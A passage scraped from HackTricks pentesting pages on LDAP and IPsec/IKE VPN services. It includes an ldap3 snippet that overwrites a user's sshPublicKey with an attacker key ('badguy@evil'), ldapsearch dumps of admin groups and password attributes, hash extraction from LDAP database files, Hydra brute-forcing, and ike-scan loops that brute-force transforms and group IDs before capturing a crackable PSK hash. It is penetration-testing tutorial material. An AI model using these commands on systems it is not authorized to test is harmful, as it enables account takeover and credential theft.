the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n194,6667,6660-7000 - Pentesting IRC\nNext\n- Network Services Pentesting\n389, 636, 3268, 3269 - Pentesting LDAP\nLast modified\n6mo ago"
    },
    {
        "title": "389, 636, 3268, 3269 - Pentesting LDAP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap",
        "text": "389, 636, 3268, 3269 - Pentesting LDAP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nExtracted from:\nhttps://searchmobilecomputing.techtarget.com/definition/LDAP\n‚Äã\nLDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to\nlocate\norganizations, individuals, and other\nresources\nsuch as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a \"lightweight\" (smaller amount of code) version of Directory Access Protocol (DAP).\nAn LDAP directory can be\ndistributed\namong many servers. Each server can have a\nreplicated\nversion of the total directory that is\nsynchronized\nperiodically. An LDAP server is called a Directory System Agent (DSA). An LDAP server that receives a request from a user takes responsibility for the request, passing it to other DSAs as necessary, but ensuring a single coordinated response for the user.\nAn LDAP directory is organized in a simple \"tree\" hierarchy consisting of the following levels:\nThe root directory (the starting place or the source of the tree), which branches out to\nCountries, each of which branches out to\nOrganizations, which branch out to\nOrganizational units (divisions, departments, and so forth), which branches out to (includes an entry for)\nIndividuals (which includes people, files, and shared resources such as printers)\nDefault port:\n389 and 636(ldaps). Global Catalog (LDAP in ActiveDirectory) is available by default on ports 3268, and 3269 for LDAPS.\nPORT    STATE SERVICE REASON\n389/tcp open  ldap    syn-ack\n636/tcp open  tcpwrapped\nLDAP Data Interchange Format\nLDIF (LDAP Data Interchange Format) defines the directory content as a set of records. It can also represent update requests (Add, Modify, Delete, Rename).\ndn:\ndc\n=\nlocal\ndc:\nlocal\nobjectClass: dcObject\n‚Äã\ndn:\ndc\n=\nmoneycorp,dc\n=\nlocal\ndc: moneycorp\nobjectClass: dcObject\nobjectClass: organization\n‚Äã\ndn\nou\n=\nit,dc\n=\nmoneycorp,dc\n=\nlocal\nobjectClass: organizationalUnit\nou: dev\n‚Äã\ndn:\nou\n=\nmarketing,dc\n=\nmoneycorp,dc\n=\nlocal\nobjectClass: organizationalUnit\nOu: sales\n‚Äã\ndn:\ncn\n=\n,ou\n=\n,dc\n=\nmoneycorp,dc\n=\nlocal\nobjectClass: personalData\ncn:\nsn:\ngn:\nuid:\nou:\nmail:\n[email¬†protected]\nphone:\n23627387495\nLines 1-3 define the top level domain local\nLines 5-8 define the first level domain moneycorp (moneycorp.local)\nLines 10-16 define 2 organizational units: dev and sales\nLines 18-26 create an object of the domain and assign attributes with values\nWrite data\nNote that if you can modify values you could be able to perform really interesting actions. For example, imagine that you\ncan change the \"sshPublicKey\" information\nof your user or any user. It's highly probable that if this attribute exist, then\nssh is reading the public keys from LDAP\n. If you can modify the public key of a user you\nwill be able to login as that user even if password authentication is not enabled in ssh\n.\n>>>\nimport\nldap3\n>>>\nserver\n=\nldap3.Server\n(\n'x.x.x.x'\n, port\n=\n636\n, use_ssl\n=\nTrue\n)\n>>>\nconnection\n=\nldap3.Connection\n(\nserver,\n'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'\n,\n'PASSWORD'\n,\nauto_bind\n=\nTrue\n)\n>>>\nconnection.bind\n()\nTrue\n>>>\nconnection.extend.standard.who_am_i\n()\nu\n'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'\n>>>\nconnection.modify\n(\n'uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN'\n,\n{\n'sshPublicKey'\n:\n[(\nldap3.MODIFY_REPLACE,\n[\n'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'\n])]})\nExample taken from:\nhttps://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/\n‚Äã\nSniff clear text credentials\nIf LDAP is used without SSL you can\nsniff credentials in plain text\nin the network.\nAlso, you can perform a\nMITM\nattack in the network\nbetween the LDAP server and the client.\nHere you can make a\nDowngrade Attack\nso the client with use the\ncredentials in clear text\nto login.\nIf SSL is used\nyou can try to make\nMITM\nlike the mentioned above but offering a\nfalse certificate\n, if the\nuser accepts it\n, you are able to Downgrade the authentication method and see the credentials again.\nAnonymous Access\nBypass TLS SNI check\nAccording to\nthis writeup\njust by accessing the LDAP server with an arbitrary domain name (like company.com) he was able to contact the LDAP service and extract information as an anonymous user:\nldapsearch\n-H\nldaps://company.com:636/\n-x\n-s\nbase\n-b\n''\n\"(objectClass=*)\"\n\"*\"\n+\nLDAP anonymous binds\n‚Äã\nLDAP anonymous binds\nallow\nunauthenticated attackers\nto retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a\nlegacy configuration\n, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests.\nHowever, admins may have needed to\nset up a particular application to allow anonymous binds\nand given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.\nValid Credentials\nIf you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:\n‚Äã\nldapdomaindump\n‚Äã\npip3\ninstall\nldapdomaindump\nldapdomaindump\n<\nIP\n>\n[\n-r\n<\nIP\n>\n]\n-u\n'<domain>\\<username>'\n-p\n'<password>'\n[\n--authtype SIMPLE\n]\n--no-json --no-grep\n[\n-o /path/dir\n]\n‚Äã\nBrute Force\n‚Äã\nEnumeration\nAutomated\nUsing this you will be able to see the\npublic information\n(like the domain name)\n:\nnmap\n-n\n-sV\n--script\n\"ldap* and not brute\"\n<\nIP\n>\n#Using anonymous credentials\nPython\nSee LDAP enumeration with python\nYou can try to\nenumerate a LDAP with or without credentials using python\n:\npip3 install ldap3\nFirst try to\nconnect without\ncredentials:\n>>>\nimport\nldap3\n>>>\nserver\n=\nldap3.Server\n(\n'x.X.x.X'\n, get_info\n=\nldap3.ALL, port\n=\n636\n, use_ssl\n=\nTrue\n)\n>>>\nconnection\n=\nldap3.Connection\n(\nserver\n)\n>>>\nconnection.bind\n()\nTrue\n>>>\nserver.info\nIf the response is\nTrue\nlike in the previous example, you can obtain some\ninteresting data\nof the LDAP (like the\nnaming context\nor\ndomain name\n) server from:\n>>>\nserver.info\nDSA info\n(\nfrom DSE\n)\n:\nSupported LDAP versions:\n3\nNaming contexts:\ndc\n=\nDOMAIN,dc\n=\nDOMAIN\nOnce you have the naming context you can make some more exciting queries. This simply query should show you all the objects in the directory:\n>>>\nconnection.search\n(\nsearch_base\n=\n'DC=DOMAIN,DC=DOMAIN'\n,\nsearch_filter\n=\n'(&(objectClass=*))'\n,\nsearch_scope\n=\n'SUBTREE'\n,\nattributes\n=\n'*'\n)\nTrue\n>>\nconnection.entries\nOr\ndump\nthe whole ldap:\n>>\nconnection.search\n(\nsearch_base\n=\n'DC=DOMAIN,DC=DOMAIN'\n,\nsearch_filter\n=\n'(&(objectClass=person))'\n,\nsearch_scope\n=\n'SUBTREE'\n,\nattributes\n=\n'userPassword'\n)\nTrue\n>>>\nconnection.entries\nwindapsearch\n‚Äã\nWindapsearch\n**** is a Python script useful to\nenumerate users, groups, and computers from a Windows\ndomain by utilizing LDAP queries.\n# Get computers\npython3 windapsearch.py --dc-ip\n10.10\n.10.10\n-u\n[email¬†protected]\n-p\npassword\n--computers\n# Get groups\npython3 windapsearch.py --dc-ip\n10.10\n.10.10\n-u\n[email¬†protected]\n-p\npassword\n--groups\n# Get users\npython3 windapsearch.py --dc-ip\n10.10\n.10.10\n-u\n[email¬†protected]\n-p\npassword\n--da\n# Get Domain Admins\npython3 windapsearch.py --dc-ip\n10.10\n.10.10\n-u\n[email¬†protected]\n-p\npassword\n--da\n# Get Privileged Users\npython3 windapsearch.py --dc-ip\n10.10\n.10.10\n-u\n[email¬†protected]\n-p\npassword --privileged-users\nldapsearch\nCheck null credentials or if your credentials are valid:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n''\n-w\n''\n-b\n\"DC=<1_SUBDOMAIN>,DC=<TLD>\"\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"DC=<1_SUBDOMAIN>,DC=<TLD>\"\n# CREDENTIALS NOT VALID RESPONSE\nsearch:\n2\nresult:\n1\nOperations error\ntext: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera\ntion a successful\nbind\nmust be completed on the connection., data\n0\n, v3839\nIf you find something saying that the \"\nbind must be completed\n\" means that the credentials are incorrect.\nYou can extract\neverything from a domain\nusing:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"DC=<1_SUBDOMAIN>,DC=<TLD>\"\n-x\nSimple Authentication\n-H\nLDAP Server\n-D\nMy User\n-w\nMy password\n-b\nBase site, all data from here will be given\nExtract\nusers\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>\"\n#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\\john' -w 'johnpassw' -b \"CN=Users,DC=mydom,DC=local\"\nExtract\ncomputers\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>\"\nExtract\nmy info\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>\"\nExtract\nDomain Admins\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>\"\nExtract\nDomain Users\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>\"\nExtract\nEnterprise Admins\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>\"\nExtract\nAdministrators\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>\"\nExtract\nRemote Desktop Group\n:\nldapsearch\n-x\n-H\nldap://\n<\nIP\n>\n-D\n'<DOMAIN>\\<username>'\n-w\n'<password>'\n-b\n\"CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>\"\nTo see if you have access to any password you can use grep after executing one of the queries:\n<\nldapsearchcmd\n..\n.\n>\n|\ngrep\n-i\n-A2\n-B2\n\"userpas\"\nPlease, notice that the passwords that you can find here could not be the real ones...\npbis\nYou can download\npbis\nfrom here:\nhttps://github.com/BeyondTrust/pbis-open/\nand it's usually installed in\n/opt/pbis\n.\nPbis\nallow you to get basic information easily:\n#Read keytab file\n./klist\n-k\n/etc/krb5.keytab\n‚Äã\n#Get known domains info\n./get-status\n./lsa get-status\n‚Äã\n#Get basic metrics\n./get-metrics\n./lsa get-metrics\n‚Äã\n#Get users\n./enum-users\n./lsa enum-users\n‚Äã\n#Get groups\n./enum-groups\n./lsa enum-groups\n‚Äã\n#Get all kind of objects\n./enum-objects\n./lsa enum-objects\n‚Äã\n#Get groups of a user\n./list-groups-for-user\n<\nusername\n>\n./lsa list-groups-for-user\n<\nusername\n>\n#Get groups of each user\n./enum-users\n|\ngrep\n\"Name:\"\n|\nsed\n-e\n\"s,\n\\\\\n\\,\n\\\\\\\\\\\\\n\\,g\"\n|\nawk\n'{print $2}'\n|\nwhile\nread\nname\n;\ndo\n./list-groups-for-user\n\"\n$name\n\"\n;\necho\n-e\n\"========================\n\\n\n\"\n;\ndone\n‚Äã\n#Get users of a group\n./enum-members --by-name\n\"domain admins\"\n./lsa enum-members --by-name\n\"domain admins\"\n#Get users of each group\n./enum-groups\n|\ngrep\n\"Name:\"\n|\nsed\n-e\n\"s,\n\\\\\n\\,\n\\\\\\\\\\\\\n\\,g\"\n|\nawk\n'{print $2}'\n|\nwhile\nread\nname\n;\ndo\necho\n\"\n$name\n\"\n;\n./enum-members --by-name\n\"\n$name\n\"\n;\necho\n-e\n\"========================\n\\n\n\"\n;\ndone\n‚Äã\n#Get description of each user\n./adtool\n-a\nsearch-user\n--name\nCN\n=\n\"*\"\n--keytab\n=\n/etc/krb5.keytab\n-n\n<\nUsername\n>\n|\ngrep\n\"CN\"\n|\nwhile\nread\nline\n;\ndo\necho\n\"\n$line\n\"\n;\n./adtool\n--keytab\n=\n/etc/krb5.keytab\n-n\n<\nusername\n>\n-a\nlookup-object\n--dn\n=\n\"\n$line\n\"\n--attr\n\"description\"\n;\necho\n\"======================\"\ndone\nGraphical Interface\nApache Directory\n‚Äã\nDownload Apache Directory from here\n. You can find an\nexample of how to use this tool here\n.\njxplorer\nYou can download a graphical interface with LDAP server here:\nhttp://www.jxplorer.org/downloads/users.html\n‚Äã\nBy default is is installed in:\n/opt/jxplorer\nAuthentication via kerberos\nUsing\nldapsearch\nyou can\nauthenticate\nagainst\nkerberos instead\nof via\nNTLM\nby using the parameter\n-Y GSSAPI\nPOST\nIf you can access the files where the databases are contained (could be in\n/var/lib/ldap\n). You can extract the hashes using:\ncat\n/var/lib/ldap/*.bdb\n|\ngrep\n-i\n-a\n-E\n-o\n\"description.*\"\n|\nsort\n|\nuniq\n-u\nYou can feed john with the password hash (from '{SSHA}' to 'structural' without adding 'structural').\nConfiguration Files\nGeneral\ncontainers.ldif\nldap.cfg\nldap.conf\nldap.xml\nldap-config.xml\nldap-realm.xml\nslapd.conf\nIBM SecureWay V3 server\nV3.sas.oc\nMicrosoft Active Directory server\nmsadClassesAttrs.ldif\nNetscape Directory Server 4\nnsslapd.sas_at.conf\nnsslapd.sas_oc.conf\nOpenLDAP directory server\nslapd.sas_at.conf\nslapd.sas_oc.conf\nSun ONE Directory Server 5.1\n75sas.ldif\nHackTricks Automatic Commands\nProtocol_Name: LDAP    #Protocol Abbreviation if there is one.\nPort_Number:  389,636     #Comma separated if there is more than one.\nProtocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for LDAP\nNote: |\nLDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a \"lightweight\" (smaller amount of code) version of Directory Access Protocol (DAP).\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-ldap\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Grab LDAP Banner\nCommand: nmap -p 389 --script ldap-search -Pn {IP}\n‚Äã\nEntry_3:\nName: LdapSearch\nDescription: Base LdapSearch\nCommand: ldapsearch -H ldap://{IP} -x\n‚Äã\nEntry_4:\nName: LdapSearch Naming Context Dump\nDescription: Attempt to get LDAP Naming Context\nCommand: ldapsearch -H ldap://{IP} -x -s base namingcontexts\n‚Äã\nEntry_5:\nName: LdapSearch Big Dump\nDescription: Need Naming Context to do big dump\nCommand: ldapsearch -H ldap://{IP} -x -b \"{Naming_Context}\"\n‚Äã\nEntry_6:\nName: Hydra Brute Force\nDescription: Need User\nCommand: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n264 - Pentesting Check Point FireWall-1\nNext\n- Network Services Pentesting\n500/udp - Pentesting IPsec/IKE VPN\nLast modified\n6mo ago"
    },
    {
        "title": "500/udp - Pentesting IPsec/IKE VPN",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting",
        "text": "500/udp - Pentesting IPsec/IKE VPN\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nBasic Information\nIPsec is the most commonly used technology for both gateway-to-gateway (LAN-to-LAN) and host to gateway (remote access) enterprise VPN solutions.\nIKE is a type of ISAKMP\n(Internet Security Association Key Management Protocol) implementation, which is a framework for authentication and key exchange. IKE establishes the security association (SA) between two endpoints through a three-phase process:\nPhase 1:\nEstablish a secure channel between 2 endpoints using a Pre-Shared Key (PSK) or certificates. It can use main mode (3 pairs of messages) or\naggresive\nmode.\nPhase1.5:\nThis is optional, is called Extended Authentication Phase and authenticates the user that is trying to connect (user+password).\nPhase2:\nNegotiates the parameter for the data security using ESP and AH. It can use a different algorithm than the one used in phase 1 (Perfect Forward Secrecy (PFS)).\nDefault port:\n500/udp\nDiscover\nthe service using nmap\nroot@bt:~# nmap -sU -p 500 172.16.21.200\nStarting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST\nNmap scan report for 172.16.21.200\nHost is up (0.00036s latency).\nPORT    STATE SERVICE\n500/udp open  isakmp\nMAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)\nFinding a valid transformation\nThe IPSec configuration can be prepared only to accept one or a few transformations. A transformation is a combination of values.\nEach transform\ncontains a number of attributes like DES or 3DES as the\nencryption algorithm\n, SHA or MD5 as the\nintegrity algorithm\n, a pre-shared key as the\nauthentication type\n, Diffie-Hellman 1 or 2 as the key\ndistribution algorithm\nand 28800 seconds as the\nlifetime\n.\nThen, the first thing that you have to do is to\nfind a valid transformation\n, so the server will talk to you. To do so, you can use the tool\nike-scan\n. By default, Ike-scan works in main mode, and sends a packet to the gateway with an ISAKMP header and a single proposal with\neight transforms inside it\n.\nDepending on the response you can obtain some information about the endpoint:\nroot@bt:~# ike-scan -M 172.16.21.200\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n172.16.21.200    Main Mode Handshake returned\nHDR=(CKY-R=d90bf054d6b76401)\nSA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\nVID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\nEnding ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify\nAs you can see in the previous response, there is a field called\nAUTH\nwith the value\nPSK\n. This means that the vpn is configured using a preshared key (and this is really good for a pentester).\nThe value of the last line is also very important:\n0 returned handshake; 0 returned notify:\nThis means the target is\nnot an IPsec gateway\n.\n1 returned handshake; 0 returned notify:\nThis means the\ntarget is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable\n(a valid transform will be shown in the output).\n0 returned handshake; 1 returned notify:\nVPN gateways respond with a notify message when\nnone of the transforms are acceptable\n(though some gateways do not, in which case further analysis and a revised proposal should be tried).\nThen, in this case we already have a valid transformation but if you are in the 3rd case, then you need to\nbrute-force a little bit to find a valid transformation:\nFirst of all you need to create all the possible transformations:\nfor\nENC\nin\n1\n2\n3\n4\n5\n6\n7\n/128\n7\n/192\n7\n/256\n8\n;\ndo\nfor\nHASH\nin\n1\n2\n3\n4\n5\n6\n;\ndo\nfor\nAUTH\nin\n1\n2\n3\n4\n5\n6\n7\n8\n64221\n64222\n64223\n64224\n65001\n65002\n65003\n65004\n65005\n65006\n65007\n65008\n65009\n65010\n;\ndo\nfor\nGROUP\nin\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n;\ndo\necho\n\"--trans=\n$ENC\n,\n$HASH\n,\n$AUTH\n,\n$GROUP\n\"\n>>\nike-dict.txt\n;\ndone\n;\ndone\n;\ndone\n;\ndone\nAnd then brute-force each one using ike-scan (this can take several minutes):\nwhile\nread\nline\n;\ndo\n(\necho\n\"Valid trans found:\n$line\n\"\n&&\nsudo\nike-scan\n-M\n$line\n<\nIP\n>\n)\n|\ngrep\n-B14\n\"1 returned handshake\"\n|\ngrep\n\"Valid trans found\"\n;\ndone\n<\nike-dict.txt\nIf the brute-force didn't work, maybe the server is responding without handshakes even to valid transforms. Then, you could try the same brute-force but using aggressive mode:\nwhile\nread\nline\n;\ndo\n(\necho\n\"Valid trans found:\n$line\n\"\n&&\nike-scan\n-M\n--aggressive\n-P\nhandshake.txt\n$line\n<\nIP\n>\n)\n|\ngrep\n-B7\n\"SA=\"\n|\ngrep\n\"Valid trans found\"\n;\ndone\n<\nike-dict.txt\nHopefully\na valid transformation is echoed back\n.\nYou can try the\nsame attack\nusing\niker.py\n.\nYou could also try to brute force transformations with\nikeforce\n:\n./ikeforce.py\n<\nIP\n>\n# No parameters are required for scan -h for additional help\nIn\nDH Group: 14 = 2048-bit MODP\nand\n15 = 3072-bit\n2 = HMAC-SHA = SHA1 (in this case). The --trans format is $Enc,$Hash,$Auth,$DH\nCisco recommends avoidance of DH groups 1 and 2 in particular. The paper‚Äôs authors describe how it is likely that\nnation states can decrypt IPsec sessions negotiated using weak groups via discrete log precomputation\n. The hundreds of millions of dollars spent performing precomputation are amortised through the real-time decryption of any session using a weak group (1,024-bit or smaller).\nServer fingerprinting\nThen, you can use ike-scan to try to\ndiscover the vendor\nof the device. The tool send an initial proposal and stops replaying. Then, it will\nanalyze\nthe\ntime\ndifference\nbetween\nthe received\nmessages\nfrom the server and the matching response pattern, the pentester can successfully fingerprint the VPN gateway vendor. More over, some VPN servers will use the optional\nVendor ID (VID) payload\nwith IKE.\nSpecify the valid transformation if needed\n(using --trans)\nIf IKE discover which is the vendor it will print it:\nroot@bt:~# ike-scan -M --showbackoff 172.16.21.200\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n172.16.21.200    Main Mode Handshake returned\nHDR=(CKY-R=4f3ec84731e2214a)\nSA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\nVID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\nIKE Backoff Patterns:\nIP Address       No.  Recv time            Delta Time\n172.16.21.200    1    1322286031.744904    0.000000\n172.16.21.200    2    1322286039.745081    8.000177\n172.16.21.200    3    1322286047.745989    8.000908\n172.16.21.200    4    1322286055.746972    8.000983\n172.16.21.200    Implementation guess: Cisco VPN Concentrator\nEnding ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify\nThis can be also achieve with nmap script\nike-version\nFinding the correct ID (group name)\nFor being allowed to capture the hash you need a valid transformation supporting Aggressive mode and the correct ID (group name). You probably won't know the valid group name, so you will have to brute-force it.\nTo do so, I would recommend you 2 methods:\nBruteforcing ID with ike-scan\nFirst of all try to make a request with a fake ID trying to gather the hash (\"-P\"):\nike-scan\n-P\n-M\n-A\n-n\nfakeID\n<\nIP\n>\nIf\nno hash is returned\n, then probably this method of brute forcing will work.\nIf some hash is returned, this means that a fake hash is going to be sent back for a fake ID, so this method won't be reliable\nto brute-force the ID. For example, a fake hash could be returned (this happens in modern versions):\nBut if as I have said, no hash is returned, then you should try to brute-force common group names using ike-scan.\nThis script\nwill try to brute-force possible IDs\nand will return the IDs where a valid handshake is returned (this will be a valid group name).\nIf you have discovered an specific transformation add it in the ike-scan command. And if you have discovered several transformations feel free to add a new loop to try them all (you should try them all until one of them is working properly).\nYou can use the\ndictionary of ikeforce\nor\nthe one in seclists\nof common group names to brute-force them:\nwhile\nread\nline\n;\ndo\n(\necho\n\"Found ID:\n$line\n\"\n&&\nsudo\nike-scan\n-M\n-A\n-n\n$line\n<\nIP\n>\n)\n|\ngrep\n-B14\n\"1 returned handshake\"\n|\ngrep\n\"Found ID:\"\n;\ndone\n<\n/usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt\nOr use this dict (is a combination of the other 2 dicts without repetitions):\nvpnIDs.txt\n2KB\nText\nBruteforcing ID with Iker\n‚Äã\niker.py\nalso uses\nike-scan\nto bruteforce possible group names. It follows it's own method to\nfind a valid ID based on the output of ike-scan\n.\nBruteforcing ID with ikeforce\n‚Äã\nikeforce.py\nis a tool that can be used to\nbrute force IDs also\n. This tool will\ntry to exploit different vulnerabilities\nthat could be used to\ndistinguish between a valid and a non-valid ID\n(could have false positives and false negatives, that is why I prefer to use the ike-scan method if possible).\nBy default\nikeforce\nwill send at the beginning some random ids to check the behaviour of the server and determinate the tactic to use.\nThe\nfirst method\nis to brute-force the group names by\nsearching\nfor the information\nDead Peer Detection DPD\nof Cisco systems (this info is only replayed by the server if the group name is correct).\nThe\nsecond method\navailable is to\nchecks the number of responses sent to each try\nbecause sometimes more packets are sent when the correct id is used.\nThe\nthird method\nconsist on\nsearching for \"INVALID-ID-INFORMATION\" in response to incorrect ID\n.\nFinally, if the server does not replay anything to the checks,\nikeforce\nwill try to brute force the server and check if when the correct id is sent the server replay with some packet.\nObviously, the goal of brute forcing the id is to get the\nPSK\nwhen you have a valid id. Then, with the\nid\nand\nPSK\nyou will have to bruteforce the XAUTH (if it is enabled).\nIf you have discovered an specific transformation add it in the ikeforce command. And if you have discovered several transformations feel free to add a new loop to try them all (you should try them all until one of them is working properly).\ngit\nclone https://github.com/SpiderLabs/ikeforce.git\npip\ninstall\n'pyopenssl==17.2.0'\n#It is old and need this version of the library\n./ikeforce.py\n<\nIP\n>\n-e\n-w\n./wordlists/groupnames.dic\nSniffing ID\nIt is also possible to obtain valid usernames by sniffing the connection between the VPN client and server, as the first aggressive mode packet containing the client ID is sent in the clear (from the book\nNetwork Security Assessment: Know Your Network\n)\nCapturing & cracking the hash\nFinally, If you have found a\nvalid transformation\nand the\ngroup name\nand if the\naggressive mode is allowed\n, then you can very easily grab the crackable hash:\nike-scan\n-M\n-A\n-n\n<\nID\n>\n--pskcrack\n=\nhash.txt\n<\nIP\n>\n#If aggressive mode is supported and you know the id, you can get the hash of the passwor\nThe hash will be 